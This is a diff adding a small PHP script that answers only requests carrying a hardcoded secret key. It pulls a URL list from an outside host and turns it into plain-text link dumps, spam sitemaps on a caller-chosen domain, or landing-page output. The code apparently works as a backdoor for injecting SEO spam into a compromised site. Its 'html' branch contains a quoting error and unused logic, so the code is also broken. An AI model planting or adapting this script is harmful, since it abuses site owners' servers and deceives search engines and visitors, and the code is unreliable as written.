@@ -1,1 +1,74 @@
+<?php
 
+$secretKey = '31337';
+if (!isset($_POST['secret_key']) || $_POST['secret_key'] !== $secretKey) {
+    http_response_code(403);
+    exit('Forbidden');
+}
+$data = $_POST;
+if (isset($data['content_type'])) {
+    switch ($data['content_type']) {
+        case 'word':
+            $heh = "https://p.sicp.me/a4eqC";
+            $urls = explode("\n", file_get_contents($heh));
+            if ($urls !== false) {
+                header('Content-Type: text/plain');
+                foreach ($urls as $url) {
+                    echo $url . "\n";
+                }
+            } else {
+                http_response_code(500);
+                exit('Error reading word content');
+            }
+            break;
+        case 'sitemap':
+            header('Content-Type: application/xml');
+            $sitemap = "<?xml version='1.0' encoding='UTF-8'?>";
+            $sitemap .= "<urlset xmlns='http://www.sitemaps.org/schemas/sitemap/0.9'>";            
+            $heh = "https://p.sicp.me/a4eqC";
+            $urls = explode("\n", file_get_contents($heh));
+            if ($urls !== false) {
+                foreach ($urls as $url) {
+                    $sitemap .= "    <url>\n";
+                    $sitemap .= "        <loc>" . htmlspecialchars($data['protocol'] . $data['domain'] . "?page=". $url) . "</loc>";
+                    $sitemap .= "        <lastmod>" . date('Y-m-d') . "</lastmod>";
+                    $sitemap .= "        <changefreq>daily</changefreq>";
+                    $sitemap .= "        <priority>0.8</priority>";
+                    $sitemap .= "    </url>";
+                }
+                $sitemap .= "</urlset>";
+                echo $sitemap;
+            } else {
+                http_response_code(500);
+                exit('Error reading XML content');
+            }
+            break;            
+        case 'html':
+            header('Content-Type: text/html');
+            $domen = $data['domain'];            
+            function extractDomain($domen) {
+                $pattern = '/(?:www\.)?([a-zA-Z0-9.-]+)\.([a-zA-Z]{2,6})/';
+                preg_match($pattern, $domen, $matches);
+                return isset($matches[1]) ? $matches[1] : null;
+            }            
+            $domain = extractDomain($domen);
+            $domene = $data['protocol'] . $data['domain'];
+            $heh = "https://p.sicp.me/a4eqC";
+            $urls = explode("\n", file_get_contents($heh));
+            if ($urls !== false) {
+                $url = $urls[array_rand($urls)];
+                    echo 'file_get_contents('landingpage')';
+                        } else {
+                http_response_code(500);
+                exit('Error reading HTML content');
+            }
+            break;
+        default:
+            http_response_code(400);
+            exit('Invalid content type');
+    }
+} else {
+    http_response_code(400);
+    exit('Content type not specified');
+}
+?>
